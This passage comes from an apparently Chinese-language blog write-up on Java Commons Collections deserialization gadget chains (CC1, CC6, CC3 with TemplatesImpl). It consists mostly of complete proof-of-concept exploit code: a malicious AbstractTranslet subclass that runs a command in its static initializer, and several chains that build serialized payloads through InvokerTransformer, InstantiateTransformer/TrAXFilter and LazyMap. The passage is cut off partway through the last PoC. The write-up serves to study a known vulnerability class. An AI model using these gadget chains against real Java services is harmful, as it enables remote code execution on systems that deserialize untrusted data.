com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>第一个transform是其父类AbstractTranslet的接口Translet中未被实现的方法，之所以只有这一个方法未被实现是因为其他方法在其父类AbstractTranslet中已被实现</p><p>第二个transform是其父类AbstractTranslet中未被实现的方法</p></blockquote><h3 id="CC1结合Templateslmpl"><a href="#CC1结合Templateslmpl" class="headerlink" title="CC1结合Templateslmpl"></a>CC1结合Templateslmpl</h3><p>上面poc最后会触发执行 TemplatesImpl.newTransformer() 方法</p><p>我们可以用CC1通过transform反射调用  TemplatesImpl.newTransformer()</p><p>poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://14.Java/java test/CCtest/target/classes/org/example/test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes =&#123;code&#125; ;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        </span><br><span class="line">        HashMap&lt;Object,Object&gt; hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap= LazyMap.decorate(hashmap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">annotation</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationDeclaredConstructor</span> <span class="operator">=</span> annotation.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationDeclaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">instance</span> <span class="operator">=</span>(InvocationHandler) annotationDeclaredConstructor.newInstance(Target.class,lazymap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyInstance</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, instance);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationDeclaredConstructor.newInstance(Target.class,proxyInstance);</span><br><span class="line"></span><br><span class="line">        serialize(o);  <span class="comment">//序列化</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>); <span class="comment">//反序列化</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span> <span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span> <span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是把CC1中transform调用的类和方法换了一下，其他没变</p><h3 id="CC6结合Templateslmpl"><a href="#CC6结合Templateslmpl" class="headerlink" title="CC6结合Templateslmpl"></a>CC6结合Templateslmpl</h3><p>就和CC1结合Templateslmpl差不多，也是transform反射调用 TemplatesImpl.newTransformer()</p><p>poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://14.Java/java test/CCtest/target/classes/org/example/test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes =&#123;code&#125; ;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap= LazyMap.decorate(hashmap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;key&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        lazymap.remove(<span class="string">&quot;key&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazymap,chainedTransformer);</span><br><span class="line">        serialize(map2);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span> <span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span> <span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CC3本身反序列化分析"><a href="#CC3本身反序列化分析" class="headerlink" title="CC3本身反序列化分析"></a>CC3本身反序列化分析</h3><p>以上CC1和CC6与Templateslmpl最后都是用InvokerTransformer.transform()反射调用 TemplatesImpl.newTransformer()，但有时候InvokerTransformer会被过滤，我们可以分析下看还有没有什么地方调用了 newTransformer() 可以被利用，跟进TemplatesImpl.newTransformer()</p><p>有很多都调用了这个函数，我们这里选择TrAXFilter类中的</p><p><img src="/2024/06/24/CC3/Users\28698\Pictures\用qq自带图片编辑后\QQ图片20240618200330.png" alt="QQ图片20240618200330"></p><p>TrAXFilter类中的构造函数</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public TrAXFilter(Templates templates)  throws</span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates <span class="operator">=</span> templates<span class="comment">;</span></span><br><span class="line">    _transformer <span class="operator">=</span> (TransformerImpl) templates.newTransformer()<span class="comment">;</span></span><br><span class="line">    _transformerHandler <span class="operator">=</span> new TransformerHandlerImpl(_transformer)<span class="comment">;</span></span><br><span class="line">    _useServicesMechanism <span class="operator">=</span> _transformer.useServicesMechnism()<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_transformer = (TransformerImpl) templates.newTransformer();</code>调用了传入参数的newTransformer()</p><p>因此如果可以调用这个构造方法的话，就可以调用我们的newTransformer()，但是这个类没有继承serialize接口是不能被序列化的，就只能像之前获取Runtime一样 从它的Class入口 通过构造函数赋值</p><p>CC3的作者没有调用 InvokerTransformer中的transform，而是调用了一个新的类 InstantiateTransformer中的transform，跟进InstantiateTransformer类中的transform</p><p><img src="/2024/06/24/CC3/Users\28698\Pictures\用qq自带图片编辑后\QQ图片20240618202916.png" alt="QQ图片20240618202916"></p><p>它先是判断参数是否为Class类型，如果是，则获取它指定参数类型的构造器，然后再调用构造函数newInstance()将其实例化</p><p>所以我们可以通过<code>InstantiateTransformer.transform()</code> 获取 TrAXFilter类构造器并初始化，触发 <code>TemplatesImpl.newTransformer()</code></p><p>看一下InstantiateTransformer的构造函数的参数</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class<span class="selector-attr">[]</span> paramTypes, <span class="selector-tag">Object</span><span class="selector-attr">[]</span> args</span><br></pre></td></tr></table></figure><p>第一个参数是其实例化类的构造函数的参数类型，第二个参数就是其实例化类的构造函数的参数值</p><h4 id="CC3反序列化poc"><a href="#CC3反序列化poc" class="headerlink" title="CC3反序列化poc"></a>CC3反序列化poc</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://14.Java/java test/CCtest/target/classes/org/example/test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes =&#123;code&#125; ;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap= LazyMap.decorate(hashmap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">annotation</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationDeclaredConstructor</span> <span class="operator">=</span> annotation.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationDeclaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">instance</span> <span class="operator">=</span>(InvocationHandler) annotationDeclaredConstructor.newInstance(Target.class,lazymap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyInstance</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title 